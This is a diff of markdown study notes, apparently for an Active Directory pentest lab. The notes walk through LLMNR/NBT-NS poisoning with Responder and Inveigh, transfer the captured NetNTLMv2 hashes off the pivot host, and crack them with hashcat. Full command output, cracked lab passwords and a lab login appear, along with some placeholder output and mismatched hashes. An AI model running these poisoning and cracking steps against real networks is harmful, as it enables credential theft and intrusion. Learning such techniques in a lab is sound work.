@@ -613,7 +613,7 @@ sequenceDiagram
 ---
 
 <details>
-<summary><h1>📋 Initial Enumeration</h1></summary>
+<summary><h1>📋 1 - Initial Enumeration</h1></summary>
 
 <details>
 <summary><h2>External Recon and Enumeration Principles</h2></summary>
@@ -2215,15 +2215,829 @@ In the upcoming sections, we will deploy two of the most effective techniques fo
 ---
 
 <details>
-<summary><h1>🎣 Sniffing out a Foothold</h1></summary>
+<summary><h1>🎣 2 - Sniffing out a Foothold</h1></summary>
 
 <details>
 <summary><h2>LLMNR/NBT-NS Poisoning - from Linux</h2></summary>
+
+When DNS resolution fails in a Windows environment, machines will often broadcast a desperate plea to the entire local network: "Does anyone know the IP address for `\\printer01`?"
+
+This happens via two legacy protocols:
+
+1. **LLMNR** (Link-Local Multicast Name Resolution) - UDP Port 5355
+2. **NBT-NS** (NetBIOS Name Service) - UDP Port 137
+
+The vulnerability? ANY host on the network can reply.
+
+By using a tool like `Responder`, we act as a malicious name server. When a victim broadcasts a request for a non-existent host (like a typo in a share name), Responder instantly replies: _"Yes, I am `\\printer01`, send me your credentials to authenticate."_ The victim machine blindly trusts this and sends us its NetNTLMv1/v2 hash.
+
+<details>
+<summary><h3>Step-by-Step Execution</h3></summary>
+
+<details>
+<summary><h4>1. Setting the Trap (Active Mode)</h4></summary>
+
+Unlike our earlier reconnaissance phase where we used the -A (Analyze) flag, we now want Responder to actively answer queries and steal hashes.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+sudo responder -I ens224
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+#                                          __
+#   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+#   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+#   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+#                    |__|
+
+#            NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+#   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+#   To kill this script hit CTRL-C
+
+# ...
+# [+] Listening for events...
+# ...
+# [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+# [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+# [MSSQL] NTLMv2 Client   : 172.16.5.130
+# [MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
+# [MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:479256321a74805b:3EC57E1F89665DD24B3906CCEE8791A1:0101000000000000D37C68B960AFDC01C76B0FCBFE230C900000000002000800370049005A00500001001E00570049004E002D005A00340048005500310037004A004C004D004200550004001400370049005A0050002E004C004F00430041004C0003003400570049004E002D005A00340048005500310037004A004C004D00420055002E00370049005A0050002E004C004F00430041004C0005001400370049005A0050002E004C004F00430041004C0008003000300000000000000000000000003000007E8439A33791B151652C96DBC4B8B1F50A9AE52F6DD07B77457EB4D935A0BDF60A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000
+# [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+# ...
+# [SMB] NTLMv2-SSP Client   : 172.16.5.130
+# [SMB] NTLMv2-SSP Username : INLANEFREIGHT\clusteragent
+# [SMB] NTLMv2-SSP Hash     : clusteragent::INLANEFREIGHT:1c79762a4d8a9588:500133B949DB3456277B72CCBD7011BB:010100000000000000FE27303FAFDC01ECFA0C496BCD5B3D0000000002000800370049005A00500001001E00570049004E002D005A00340048005500310037004A004C004D004200550004003400570049004E002D005A00340048005500310037004A004C004D00420055002E00370049005A0050002E004C004F00430041004C0003001400370049005A0050002E004C004F00430041004C0005001400370049005A0050002E004C004F00430041004C000700080000FE27303FAFDC01060004000200000008003000300000000000000000000000003000007E8439A33791B151652C96DBC4B8B1F50A9AE52F6DD07B77457EB4D935A0BDF60A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+# [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+# [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+# [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+# [SMB] NTLMv2-SSP Client   : 172.16.5.130
+# [SMB] NTLMv2-SSP Username : INLANEFREIGHT\svc_qualys
+# [SMB] NTLMv2-SSP Hash     : svc_qualys::INLANEFREIGHT:211af421dc63682a:F400CB4631AC740FCB3C5DDA60E88987:010100000000000000FE27303FAFDC0120B8DCBFCBEE40C00000000002000800370049005A00500001001E00570049004E002D005A00340048005500310037004A004C004D004200550004003400570049004E002D005A00340048005500310037004A004C004D00420055002E00370049005A0050002E004C004F00430041004C0003001400370049005A0050002E004C004F00430041004C0005001400370049005A0050002E004C004F00430041004C000700080000FE27303FAFDC01060004000200000008003000300000000000000000000000003000007E8439A33791B151652C96DBC4B8B1F50A9AE52F6DD07B77457EB4D935A0BDF60A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+# [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+# [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+# [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+# ...
+# [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+# [SMB] NTLMv2-SSP Client   : 172.16.5.130
+# [SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
+# [SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:2d8380c1b852e729:6018BB6EA1C579A72A0E882CC8408D1E:010100000000000000FE27303FAFDC01217B40216ECCAFC30000000002000800370049005A00500001001E00570049004E002D005A00340048005500310037004A004C004D004200550004003400570049004E002D005A00340048005500310037004A004C004D00420055002E00370049005A0050002E004C004F00430041004C0003001400370049005A0050002E004C004F00430041004C0005001400370049005A0050002E004C004F00430041004C000700080000FE27303FAFDC01060004000200000008003000300000000000000000000000003000007E8439A33791B151652C96DBC4B8B1F50A9AE52F6DD07B77457EB4D935A0BDF60A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+# [*] Skipping previously captured hash for INLANEFREIGHT\wley
+# ...
+# [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+# [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+# [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+# [SMB] NTLMv2-SSP Client   : 172.16.5.130
+# [SMB] NTLMv2-SSP Username : INLANEFREIGHT\forend
+# [SMB] NTLMv2-SSP Hash     : forend::INLANEFREIGHT:e6e4ecc050b659ac:B677F718C106B16784096D0939E9F2EF:010100000000000000FE27303FAFDC01D834AAD9A93FD9AD0000000002000800370049005A00500001001E00570049004E002D005A00340048005500310037004A004C004D004200550004003400570049004E002D005A00340048005500310037004A004C004D00420055002E00370049005A0050002E004C004F00430041004C0003001400370049005A0050002E004C004F00430041004C0005001400370049005A0050002E004C004F00430041004C000700080000FE27303FAFDC01060004000200000008003000300000000000000000000000003000007E8439A33791B151652C96DBC4B8B1F50A9AE52F6DD07B77457EB4D935A0BDF60A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+# [*] Skipping previously captured hash for INLANEFREIGHT\forend
+...
+# [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+# [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+# [SMB] NTLMv2-SSP Client   : 172.16.5.130
+# [SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
+# [SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:70ac00bd926ab0ad:CEBED52EC5BA6F296C96935E34E39C15:010100000000000000FE27303FAFDC01EF1E889769082D230000000002000800370049005A00500001001E00570049004E002D005A00340048005500310037004A004C004D004200550004003400570049004E002D005A00340048005500310037004A004C004D00420055002E00370049005A0050002E004C004F00430041004C0003001400370049005A0050002E004C004F00430041004C0005001400370049005A0050002E004C004F00430041004C000700080000FE27303FAFDC01060004000200000008003000300000000000000000000000003000007E8439A33791B151652C96DBC4B8B1F50A9AE52F6DD07B77457EB4D935A0BDF60A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+# [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+# ...
+# [+] Exiting...
+```
+
+</td>
+</tr>
+</table>
+
+**Captured Hashes Ledger (`172.16.5.130`)**
+
+| Username | Captured Protocol | Hash Type | Status |
+| :--- | :--- | :--- | :--- |
+| `INLANEFREIGHT\wley` | SMB | NetNTLMv2 | Captured (Pending Crack) |
+| `INLANEFREIGHT\forend` | SMB | NetNTLMv2 | Captured (Pending Crack) |
+| `INLANEFREIGHT\backupagent` | SMB | NetNTLMv2 | Captured (Pending Crack) |
+| `INLANEFREIGHT\svc_qualys` | SMB | NetNTLMv2 | Captured (Pending Crack) |
+| `INLANEFREIGHT\lab_adm` | MSSQL | NetNTLMv2 | Captured (Pending Crack) |
+| `INLANEFREIGHT\clusteragent` | SMB | NetNTLMv2 | Captured (Pending Crack) |
+
+> **NOTE:** Responder automatically saves all captured hashes in the `/usr/share/responder/logs/` directory, categorized by protocol and victim IP (e.g., `SMB-NTLMv2-SSP-172.16.5.130.txt`).
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+cat /usr/share/responder/logs/*-NTLMv2-*.txt > ~/all_captured_hashes.txt
+```
+
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+scp htb-student@10.129.5.57:~/all_captured_hashes.txt .
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# all_captured_hashes.                100%  154KB 379.8KB/s   00:00
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h4>2. Cracking the Catch (Hashcat)</h4></summary>
+
+Once we capture a NetNTLMv2 hash, we cannot use it directly in a Pass-the-Hash attack. We must crack it offline to obtain the cleartext password. We will use `hashcat` with mode 5600 (NetNTLMv2) and a robust wordlist like `rockyou.txt`.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+hashcat -m 5600 all_captured_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# hashcat (v6.2.6) starting
+
+# ...
+# WLEY::INLANEFREIGHT:8c97909457e2ac3b:a25db549b24d0b7fc6f7ad364a0cb959:010100000000000000fe27303fafdc0151d3c60cc638045f0000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
+# SVC_QUALYS::INLANEFREIGHT:fd43c5eccc6cf9f1:7917a3e2b1173b51aa7332cbd10d2eaa:010100000000000000fe27303fafdc01cb1fee7bf36eecab0000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:security#1
+# BACKUPAGENT::INLANEFREIGHT:6643cab7512aabd0:d8ff6fefa4c5edf6c537882733717c4f:010100000000000000fe27303fafdc01b64a1e96e4f296480000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
+# FOREND::INLANEFREIGHT:4fe35cd3e684dcbe:bc440e6e0781b073c6b23e90ddf916d5:010100000000000000fe27303fafdc0112f6304b76b090f40000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
+```
+
+</td>
+</tr>
+</table>
+
+**Compromised Credentials (LLMNR/NBT-NS Poisoning)**
+
+| Username | Plaintext Password | Hash Type | Extraction Method |
+| :--- | :--- | :--- | :--- |
+| `INLANEFREIGHT\wley` | `transporter@4` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\forend` | `Klmcargo2` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\backupagent` | `h1backup55` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\svc_qualys` | `security#1` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+
+</details>
+
+</details>
 
 </details>
 
 <details>
 <summary><h2>LLMNR/NBT-NS Poisoning - from Windows</h2></summary>
+
+LLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. When operating from a Windows attack host or pivoting from a compromised Windows machine where we have local administrator privileges we cannot easily run Python-based tools like `Responder`. 
+
+Instead, we use **[Inveigh](https://github.com/Kevin-Robertson/Inveigh)**, a powerful cross-platform MITM tool written in C# and PowerShell. It performs the exact same function as Responder: listening for and poisoning broadcast name resolution requests (LLMNR, mDNS, NBNS) to capture NetNTLM hashes.
+
+**Key Features of Inveigh**
+
+* **Protocols Spoofed:** `IPv4`/`IPv6`, `LLMNR`, `DNS`, `mDNS`, `NBNS`, `DHCPv6`, `ICMPv6`, `HTTP`, `HTTPS`, `SMB`, `LDAP`, `WebDAV`, and `Proxy Auth`.
+* **Format:** Available as a compiled C# executable (`Inveigh.exe`) or a PowerShell script (`Invoke-Inveigh.ps1`).
+* **Use Case:** "Living off the Land" (LotL) when operating within a purely Windows environment.
+
+The first thing we need to do, is to connect to the Windows machine using `xfreerdp`:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+xfreerdp /v:10.129.7.80 /u:htb-student /p:Academy_student_AD! /cert:ignore /dynamic-resolution
+```
+
+</td>
+</tr>
+</table>
+
+<details>
+<summary><h3>Step-by-Step Execution</h3></summary>
+
+<details>
+<summary><h4>1. Using Inveigh</h4></summary>
+
+<details>
+<summary><h5>Option a - PowerShell</h5></summary>
+
+**Import the module to the current PowerShell session**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Import-Module .\Inveigh.ps1
+```
+
+</td>
+</tr>
+</table>
+
+**List all possible parameters** 
+
+Useful for checking supported flags before execution if you forget the exact syntax.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+(Get-Command Invoke-Inveigh).Parameters
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+Key                     Value
+---                     -----
+ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
+KerberosHostHeader      System.Management.Automation.ParameterMetadata
+ProxyIgnore             System.Management.Automation.ParameterMetadata
+PcapTCP                 System.Management.Automation.ParameterMetadata
+PcapUDP                 System.Management.Automation.ParameterMetadata
+SpooferHostsReply       System.Management.Automation.ParameterMetadata
+SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
+SpooferIPsReply         System.Management.Automation.ParameterMetadata
+SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
+WPADDirectHosts         System.Management.Automation.ParameterMetadata
+WPADAuthIgnore          System.Management.Automation.ParameterMetadata
+ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
+ConsoleStatus           System.Management.Automation.ParameterMetadata
+ADIDNSThreshold         System.Management.Automation.ParameterMetadata
+ADIDNSTTL               System.Management.Automation.ParameterMetadata
+DNSTTL                  System.Management.Automation.ParameterMetadata
+HTTPPort                System.Management.Automation.ParameterMetadata
+HTTPSPort               System.Management.Automation.ParameterMetadata
+KerberosCount           System.Management.Automation.ParameterMetadata
+LLMNRTTL                System.Management.Automation.ParameterMetadata
+mDNSTTL                 System.Management.Automation.ParameterMetadata
+NBNSTTL                 System.Management.Automation.ParameterMetadata
+NBNSBruteForcePause     System.Management.Automation.ParameterMetadata
+ProxyPort               System.Management.Automation.ParameterMetadata
+RunCount                System.Management.Automation.ParameterMetadata
+RunTime                 System.Management.Automation.ParameterMetadata
+WPADPort                System.Management.Automation.ParameterMetadata
+SpooferLearningDelay    System.Management.Automation.ParameterMetadata
+SpooferLearningInterval System.Management.Automation.ParameterMetadata
+SpooferThresholdHost    System.Management.Automation.ParameterMetadata
+SpooferThresholdNetwork System.Management.Automation.ParameterMetadata
+ADIDNSDomain            System.Management.Automation.ParameterMetadata
+ADIDNSDomainController  System.Management.Automation.ParameterMetadata
+ADIDNSForest            System.Management.Automation.ParameterMetadata
+ADIDNSNS                System.Management.Automation.ParameterMetadata
+ADIDNSNSTarget          System.Management.Automation.ParameterMetadata
+ADIDNSZone              System.Management.Automation.ParameterMetadata
+HTTPBasicRealm          System.Management.Automation.ParameterMetadata
+HTTPContentType         System.Management.Automation.ParameterMetadata
+HTTPDefaultFile         System.Management.Automation.ParameterMetadata
+HTTPDefaultEXE          System.Management.Automation.ParameterMetadata
+HTTPResponse            System.Management.Automation.ParameterMetadata
+HTTPSCertIssuer         System.Management.Automation.ParameterMetadata
+HTTPSCertSubject        System.Management.Automation.ParameterMetadata
+NBNSBruteForceHost      System.Management.Automation.ParameterMetadata
+WPADResponse            System.Management.Automation.ParameterMetadata
+Challenge               System.Management.Automation.ParameterMetadata
+ConsoleUnique           System.Management.Automation.ParameterMetadata
+ADIDNS                  System.Management.Automation.ParameterMetadata
+ADIDNSPartition         System.Management.Automation.ParameterMetadata
+ADIDNSACE               System.Management.Automation.ParameterMetadata
+ADIDNSCleanup           System.Management.Automation.ParameterMetadata
+DNS                     System.Management.Automation.ParameterMetadata
+EvadeRG                 System.Management.Automation.ParameterMetadata
+FileOutput              System.Management.Automation.ParameterMetadata
+FileUnique              System.Management.Automation.ParameterMetadata
+HTTP                    System.Management.Automation.ParameterMetadata
+HTTPS                   System.Management.Automation.ParameterMetadata
+HTTPSForceCertDelete    System.Management.Automation.ParameterMetadata
+Kerberos                System.Management.Automation.ParameterMetadata
+LLMNR                   System.Management.Automation.ParameterMetadata
+LogOutput               System.Management.Automation.ParameterMetadata
+MachineAccounts         System.Management.Automation.ParameterMetadata
+mDNS                    System.Management.Automation.ParameterMetadata
+NBNS                    System.Management.Automation.ParameterMetadata
+NBNSBruteForce          System.Management.Automation.ParameterMetadata
+OutputStreamOnly        System.Management.Automation.ParameterMetadata
+Proxy                   System.Management.Automation.ParameterMetadata
+ShowHelp                System.Management.Automation.ParameterMetadata
+SMB                     System.Management.Automation.ParameterMetadata
+SpooferLearning         System.Management.Automation.ParameterMetadata
+SpooferNonprintable     System.Management.Automation.ParameterMetadata
+SpooferRepeat           System.Management.Automation.ParameterMetadata
+StatusOutput            System.Management.Automation.ParameterMetadata
+StartupChecks           System.Management.Automation.ParameterMetadata
+ConsoleOutput           System.Management.Automation.ParameterMetadata
+Elevated                System.Management.Automation.ParameterMetadata
+HTTPAuth                System.Management.Automation.ParameterMetadata
+mDNSTypes               System.Management.Automation.ParameterMetadata
+NBNSTypes               System.Management.Automation.ParameterMetadata
+Pcap                    System.Management.Automation.ParameterMetadata
+ProxyAuth               System.Management.Automation.ParameterMetadata
+Tool                    System.Management.Automation.ParameterMetadata
+WPADAuth                System.Management.Automation.ParameterMetadata
+KerberosHash            System.Management.Automation.ParameterMetadata
+FileOutputDirectory     System.Management.Automation.ParameterMetadata
+HTTPDirectory           System.Management.Automation.ParameterMetadata
+HTTPIP                  System.Management.Automation.ParameterMetadata
+IP                      System.Management.Automation.ParameterMetadata
+NBNSBruteForceTarget    System.Management.Automation.ParameterMetadata
+ProxyIP                 System.Management.Automation.ParameterMetadata
+SpooferIP               System.Management.Automation.ParameterMetadata
+WPADIP                  System.Management.Automation.ParameterMetadata
+ADIDNSCredential        System.Management.Automation.ParameterMetadata
+KerberosCredential      System.Management.Automation.ParameterMetadata
+Inspect                 System.Management.Automation.ParameterMetadata
+invalid_parameter       System.Management.Automation.ParameterMetadata
+Verbose                 System.Management.Automation.ParameterMetadata
+Debug                   System.Management.Automation.ParameterMetadata
+ErrorAction             System.Management.Automation.ParameterMetadata
+WarningAction           System.Management.Automation.ParameterMetadata
+InformationAction       System.Management.Automation.ParameterMetadata
+ErrorVariable           System.Management.Automation.ParameterMetadata
+WarningVariable         System.Management.Automation.ParameterMetadata
+InformationVariable     System.Management.Automation.ParameterMetadata
+OutVariable             System.Management.Automation.ParameterMetadata
+OutBuffer               System.Management.Automation.ParameterMetadata
+PipelineVariable        System.Management.Automation.ParameterMetadata
+```
+
+</td>
+</tr>
+</table>
+
+> **NOTE:** There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.
+
+**Execution Command**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+OUTPUT
+```
+
+</td>
+</tr>
+</table>
+
+We can see that we immediately begin getting LLMNR and mDNS requests.
+
+**Stopping the tool**
+
+The tool can be stopped by presing `ESC` or `CTRL+C`. Then, you can completely stop its process by running the following command:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Stop-Inveigh
+```
+
+</td>
+</tr>
+</table>
+
+**Retrieving Captured Hashes (Post-Execution)**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+dir
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+    Directory: C:\Users\User
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+...
+-a----         3/9/2026   8:05 PM        1039652 Inveigh-Log.txt
+-a----         3/9/2026   8:03 PM          10214 Inveigh-NTLMv2.txt
+-a----        2/22/2022   1:19 PM         303194 Inveigh.ps1
+```
+
+</td>
+</tr>
+</table>
+
+The format is: Username::Domain:Challenge:NTLMv2Response
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+type Inveigh-NTLMv2.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+forend::INLANEFREIGHT:0B4C8912EC0DE350:18D401C78F5EB3CF615CE6B4A0B47546:0101000000000000B87F0ED439B0DC018216CE7E02CC98340000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800B87F0ED439B0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+lab_adm::INLANEFREIGHT:C1C04A62DB89E311:95F98252D183F5CA24BCC96A209D77E6:0101000000000000DFCE49D739B0DC0141497E1518824F7F0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800DFCE49D739B0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
+clusteragent::INLANEFREIGHT:D0A44B274D55FAFD:620D83DEC0802D7933184664D5CE8564:0101000000000000E960CCDD39B0DC01318F59EBDE09221F0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800E960CCDD39B0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+wley::INLANEFREIGHT:A14895B3E30A8306:5EE0780FF8495A7AEB367ED8428D4C95:010100000000000042AB4BFD39B0DC011EFB6EAFA54BB0EC0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080042AB4BFD39B0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+svc_qualys::INLANEFREIGHT:E7C9D634951694F9:F4672F31A6EBFE60B3570E8881909260:01010000000000002A8717023AB0DC01E7AFFF41C68309000000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008002A8717023AB0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+backupagent::INLANEFREIGHT:240972D0EC2504E2:9AEBBD4B9933CE51BE31BDEF84E90EFE:01010000000000003E1FC06C3AB0DC018D791314525EB9AA0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008003E1FC06C3AB0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+```
+
+</td>
+</tr>
+</table>
+
+Users captured:
+
+* forend
+* lab_adm
